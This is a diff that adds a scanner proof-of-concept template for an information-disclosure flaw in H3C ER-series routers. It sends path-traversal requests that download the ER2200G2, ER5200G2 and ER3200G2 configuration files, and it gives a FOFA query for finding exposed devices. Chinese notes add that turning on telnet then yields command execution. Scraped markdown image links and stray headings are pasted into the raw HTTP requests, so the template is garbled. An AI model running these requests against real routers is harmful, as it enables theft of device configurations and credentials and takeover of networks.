@@ -1,0 +1,87 @@
+id: poc-nw0u2n7tyls0kb54
+info:
+  name: H3C多系列路由器ER2200G2存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nw0u2n7tyls0kb54'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nw0u2n7tyls0kb54
+    fofa: app.name="H3C Router Management"
+http:
+- raw:
+  - 'GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
+
+    User-Agent: Java/1.8.0_381
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744953881671-2334a3f6-7c99-4184-9b43-41cd510e25a7.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744953881965-44d8b201-6e06-46f1-b38a-6d7fec8b7611.png)
+
+
+
+    2、ER5200G2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg HTTP/1.1
+
+    User-Agent: Java/1.8.0_381
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744953882257-64626ca8-39fd-42ff-8c3f-3aed762dbf75.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744953882472-d78eaafd-1e9a-4583-941e-573eab33a9a1.png)
+
+    3、ER3200G2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /userLogin.asp/../actionpolicy_status/../ER3200G2.cfg HTTP/1.1
+
+    User-Agent: Java/1.8.0_381
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744953882661-fea7c37f-e1a7-41b0-8403-d214ae734bfa.png)
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744953882825-fcffd714-7ef9-4e3c-aded-fe26f211465a.png)
+
+
+    Python检测
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744953883218-7dca1394-b630-4514-b23f-e92391dbcb10.png)
+
+
+    远程管理->远程telnet管理处开启telnet可获取命令执行权限
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744953883505-719e6443-f837-440c-bc47-6bd14aa06934.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
